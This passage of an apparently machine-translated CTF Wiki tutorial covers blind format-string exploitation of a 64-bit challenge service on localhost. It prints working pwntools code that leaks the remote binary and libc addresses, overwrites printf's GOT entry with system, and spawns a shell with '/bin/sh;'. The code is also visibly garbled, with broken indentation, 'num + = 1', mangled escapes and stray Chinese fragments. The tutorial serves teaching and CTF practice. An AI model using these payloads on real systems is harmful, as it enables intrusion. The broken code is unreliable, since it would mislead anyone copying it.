    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%</span><span class="si">{}</span><span class="s1">$p&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="n">leak</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div>
<p>Finally, I simply looked at the output and got the flag.</p>
<div class="highlight"><pre><span></span><code>////////

////////

<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span>ff
flag<span class="w"> </span><span class="o">{</span>exam
s_is_fla

g<span class="o">}</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span>

<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span><span class="se">\x</span>fe<span class="se">\x</span>7f<span class="se">\x</span><span class="m">00</span><span class="se">\x</span><span class="m">00</span>
</code></pre></div>
<h3 id="example-2-blind-hijacking-got">Example 2 - Blind hijacking got<a class="headerlink" href="#example-2-blind-hijacking-got" title="Permanent link">&para;</a></h3>
<p>The source code and deployment files are already in the <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got">blind_fmt_got</a> folder.</p>
<h4 id="determine-the-number-of-programs_1">Determine the number of programs<a class="headerlink" href="#determine-the-number-of-programs_1" title="Permanent link">&para;</a></h4>
<p>By simply testing, we found that this program is a format string vulnerability function, and the program is 64-bit.</p>
<div class="highlight"><pre><span></span><code>➜<span class="w">  </span>blind_fmt_got<span class="w"> </span>git:<span class="o">(</span>master<span class="o">)</span><span class="w"> </span>✗<span class="w"> </span>nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">9999</span>

%p

0x7fff3b9774c0
</code></pre></div>
<p>This time, I didn&#39;t show it back. I tried it again and found that there was nothing wrong with it. Then we had to leak a wave of source programs.</p>
<h4 id="determining-the-offset_2">Determining the offset<a class="headerlink" href="#determining-the-offset_2" title="Permanent link">&para;</a></h4>
<p>Before the leak procedure, we still have to determine the offset of the format string, as follows</p>
<div class="highlight"><pre><span></span><code>➜<span class="w">  </span>blind_fmt_got<span class="w"> </span>git:<span class="o">(</span>master<span class="o">)</span><span class="w"> </span>✗<span class="w"> </span>nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">9999</span>

aaaaaaaa%p%p%p%p%p%p%p%p%p

aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025
</code></pre></div>
<p>Based on this, we can know that the starting address offset of the format string is 6.</p>
<h4 id="leaking-binary">leaking binary<a class="headerlink" href="#leaking-binary" title="Permanent link">&para;</a></h4>
<p>Since the program is 64-bit, we started leaking from 0x400000. In general, blind typing with a format string vulnerability can be read into the &#39;\x00&#39; character, otherwise it can&#39;t be revealed how to play, after that, the output must be truncated by &#39;\x00&#39;, this is because The output functions of the format string exploit are truncated by &#39;\x00&#39;. . So we can use the leak code below.</p>
<div class="highlight"><pre><span></span><code><span class="c1">##coding=utf8</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>



<span class="c1">##context.log_level = &#39;debug&#39;</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>





<span class="k">def</span><span class="w"> </span><span class="nf">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>

    <span class="c1"># leak addr for three times</span>

<span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>

        <span class="k">try</span><span class="p">:</span>

            <span class="nb">print</span> <span class="s1">&#39;leak addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>

            <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

            <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%00008$s&#39;</span> <span class="o">+</span> <span class="s1">&#39;STARTEND&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>

<span class="c1">#说明有\n, a new line appears</span>
            <span class="k">if</span> <span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>

                <span class="k">return</span> <span class="kc">None</span>

            <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

            <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;STARTEND&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

            <span class="k">return</span> <span class="n">data</span>

        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>

<span class="n">num</span> <span class="o">+</span> <span class="o">=</span> <span class="mi">1</span>
            <span class="k">continue</span>

    <span class="k">return</span> <span class="kc">None</span>



<span class="k">def</span><span class="w"> </span><span class="nf">getbinary</span><span class="p">():</span>

    <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;binary&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x401000</span><span class="p">:</span>

        <span class="n">data</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>

            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="p">)</span>

            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="k">elif</span> <span class="nb">len</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>

            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="k">else</span><span class="p">:</span>

            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">addr</span> <span class="o">+</span> <span class="o">=</span> <span class="nb">len</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">getbinary</span><span class="p">()</span>
</code></pre></div>
<p>It should be noted that in the payload, it is necessary to judge whether or not &#39;\n&#39; appears, because this will cause the source program to read only the previous content, and there is no way to leak the memory, so it is necessary to skip such an address.</p>
<h4 id="ary">分析斌ary<a class="headerlink" href="#ary" title="Permanent link">&para;</a></h4>
<p>Use IDA to open the leaked binary, change the program base address, and then simply look at it, you can basically determine the address of the source program main function.</p>
<p><code>`</code>asm
seg000:00000000004005F6                 push    rbp</p>
<p>seg000:00000000004005F7                 mov     rbp, rsp</p>
<p>seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h</p>
<p>seg000:00000000004005FE</p>
<p>seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j</p>
<p>seg000:00000000004005FE                 lea     rax, [rbp-80h]</p>
<p>seg000:0000000000400602                 mov     edx, 80h ; '€'</p>
<p>seg000:0000000000400607                 mov     rsi, rax</p>
<p>seg000: 000000000040060A mov edi, 0
seg000:000000000040060F                 mov     eax, 0</p>
<p>seg000:0000000000400614                 call    sub_4004C0</p>
<p>seg000:0000000000400619                 lea     rax, [rbp-80h]</p>
<p>seg000: 000000000040061D mov rdi, rax
seg000:0000000000400620                 mov     eax, 0</p>
<p>seg000:0000000000400625                 call    sub_4004B0</p>
<p>seg000:000000000040062A                 mov     rax, cs:601048h</p>
<p>seg000: 0000000000400631 mov rdi, rax
seg000:0000000000400634                 call    near ptr unk_4004E0</p>
<p>seg000:0000000000400639                 jmp     short loc_4005FE</p>
<div class="highlight"><pre><span></span><code>It can be basically determined that sub\_4004C0 is a read function, because the read function has a total of three parameters, which is basically read. In addition, the sub\_4004B0 called below should be the output function, and then a function should be called again, and then jump back to the read function, the program should be a while 1 loop, always executing.


#### Using ideas


After analyzing the above, we can determine the following basic ideas


- leak the address of the printf function,
- Get the corresponding libc and system function address
- Modify printf address to system function address
- Read /bin/sh; to get the shell


#### Using the program


The procedure is as follows.

```python

##coding=utf8

import math

from pwn import *

from LibcSearcher import LibcSearcher

##context.log_level = &#39;debug&#39;

context.arch = &#39;amd64&#39;

ip = &quot;127.0.0.1&quot;

port = 9999





def leak(addr):

    # leak addr for three times

num = 0
    while num &lt; 3:

        try:

            print &#39;leak addr: &#39; + hex(addr)

            sh = remote(ip, port)

            payload = &#39;%00008$s&#39; + &#39;STARTEND&#39; + p64(addr)

#说明有\n, a new line appears
            if &#39;\x0a&#39; in payload:

                return None

            sh.sendline(payload)

            data = sh.recvuntil(&#39;STARTEND&#39;, drop=True)

            sh.close()

            return data

        except Exception:

num + = 1
            continue

    return None





def getbinary():

    addr = 0x400000

    f = open(&#39;binary&#39;, &#39;w&#39;)

    while addr &lt; 0x401000:

        data = leak(addr)

        if data is None:

            f.write(&#39;\xff&#39;)

            addr += 1

elif len (data) == 0:
            f.write(&#39;\x00&#39;)

            addr += 1

        else:

            f.write(data)

addr + = len (data)
    f.close()





##getbinary()

read_got = 0x601020

printf_got = 0x601018

sh = remote(ip, port)

## let the read get resolved

sh.sendline(&#39;a&#39;)

sh.recv()

## get printf addr

payload = &#39;%00008$s&#39; + &#39;STARTEND&#39; + p64(read_got)

sh.sendline(payload)

data = sh.recvuntil (&amp;#39;STARTEND&amp;#39;, drop = True) .ljust (8, &amp;#39;x00&amp;#39;)
sh.recv()

read_addr = u64(data)



## get system addr

libc = LibcSearcher(&#39;read&#39;, read_addr)

libc_base = read_addr - libc.dump(&#39;read&#39;)

system_addr = libc_base + libc.dump(&#39;system&#39;)

log.success(&#39;system addr: &#39; + hex(system_addr))

log.success(&#39;read   addr: &#39; + hex(read_addr))

## modify printf_got

payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size=&#39;short&#39;)

## get all the addr

addr = payload[:32]

payload = &#39;%32d&#39; + payload[32:]

offset = (int)(math.ceil(len(payload) / 8.0) + 1)

for i in range(6, 10):

    old = &#39;%{}$&#39;.format(i)

    new = &#39;%{}$&#39;.format(offset + i)

    payload = payload.replace(old, new)

remainer = len(payload) % 8

payload += (8 - remainer) * &#39;a&#39;

payload += addr

sh.sendline(payload)

sh.recv()



## get shell

sh.sendline(&#39;/bin/sh;&#39;)

sh.interactive()
</code></pre></div>
<p>What needs to be noted here is this code.</p>
<div class="highlight"><pre><span></span><code><span class="c1">## modify printf_got</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">printf_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">},</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>

<span class="c1">## get all the addr</span>

<span class="n">addr</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%32d</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">[</span><span class="mi">32</span><span class="p">:]</span>

<span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>

    <span class="n">old</span> <span class="o">=</span> <span class="s1">&#39;%</span><span class="si">{}</span><span class="s1">$&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="n">new</span> <span class="o">=</span> <span class="s1">&#39;%</span><span class="si">{}</span><span class="s1">$&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">old</span><span class="p">,</span> <span class="n">new</span><span class="p">)</span>

<span class="n">remainer</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">remainer</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">addr</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</code></pre></div>
<p>Fmtstr_payload directly get the payload will put the address in front, and this will lead to &#39;\x00&#39; truncation of printf (<strong>About this problem, pwntools is currently developing an enhanced version of fmt_payload, it is estimated that it will be developed soon </strong>). So I used some tricks to put it behind. The main idea is to place the address in the 8 byte alignment and modify the offset in the payload. have to be aware of is</p>
<div class="highlight"><pre><span></span><code><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="n">math</span><span class="o">.</span><span class="n">ceil</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">/</span> <span class="mf">8.0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
</code></pre></div>
<p>This line gives the offset of the modified address in the formatted string. The reason for this is that no matter how it is modified, the more characters in the order of &#39;%order$hn&#39; will not be greater than 8. Specific can be deduced by yourself.</p>
<h3 id="title">Title<a class="headerlink" href="#title" title="Permanent link">&para;</a></h3>
<ul>
<li>SuCTF2018 - lock2 (The organizer provided the docker image: suctf/2018-pwn-lock2)</li>
</ul>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright &copy; 2021 mahaloz
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
    
  </body>
</html>